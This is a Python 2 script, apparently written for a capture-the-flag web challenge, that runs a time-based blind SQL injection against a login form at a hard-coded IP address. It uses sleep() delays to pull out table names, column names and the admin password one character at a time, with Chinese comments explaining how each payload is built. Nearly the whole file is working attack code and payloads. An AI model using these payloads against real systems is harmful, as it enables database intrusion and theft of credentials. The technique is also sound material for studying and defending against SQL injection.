# coding:utf-8
import time

import requests

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0',
    'Cookie': 'PHPSESSID=ubheb2rumf4ipiaur9hs1ng984'
}
payloads = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.,{}@#$%&*!'
print '[%s] Start to retrive MYSQL User:' % time.strftime('%H:%M:%S', time.localtime())  # 显示本地的时间
user = ''
for i in range(1, 40):
    found = False
    while found == False:
        for payload in payloads:
            time_count = 0
            for j in range(1, 3):  # 第一次给time_count赋值 第二次输出payload
                try:
                    # 盲注 在写构造语句时,可以先在mysql中先调试好.
                    # sql_inject="flag1';(select(if((ascii(mid((database()),%s,1))=%s),sleep(5),1)))#"  % (i,ord(payload))#跑出数据库injection  0x696E6A656374696F6E
                    # select if((select ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=0x64767761),1,1))=103),sleep(3),1);
                    sql_inject = "flag1';(select(if((select((ascii(mid((select(select(group_concat(table_name))from(information_schema.tables)where(table_schema=0x696E6A656374696F6E))),%s,1)))=%s)),sleep(10),1)))#" % (
                        i, ord(payload))  # 表名admin
                    # (select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)))
                    # sql_inject="flag1';(select(if((select((ascii(mid((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x61646D696E))),%s,1)))=%s)),sleep(10),1)))#" % (i,ord(payload))#字段名 id,username,password
                    # z这个爆记录 有个问题就是当记录不知一条的时候有问题这时就需要使用where
                    # select(if((select(ascii((select(mid((select(user)from(users)where(user='admin')),1,1))))=97)),sleep(2),1))
                    sql_inject = "flag1';(select(if((select(ascii((select(mid((select(password)from(admin)where(id=1)),%s,1))))=%s)),sleep(10),1)))#" % (
                        i, ord(payload))  # 用户名:admin 密码:
                    data = {'username': sql_inject, 'password': '111'}
                    url = "http://101.200.145.44/web6/auth.php"
                    respons = requests.post(url, data=data, headers=headers,
                                            timeout=5)  # 超时的时间不要超过sleep的值,才能输出except中的payload
                    print '.',
                    break
                except Exception, e:
                    # print e
                    time_count += 1
                    time.sleep(10)  # 等待服务器响应完毕
                    # print payload,

            if time_count == 2:
                user += payload
                print '\n[In propress] now user is %s' % user
                found = True
                break
print '\nFinally,MYSQL user is', user
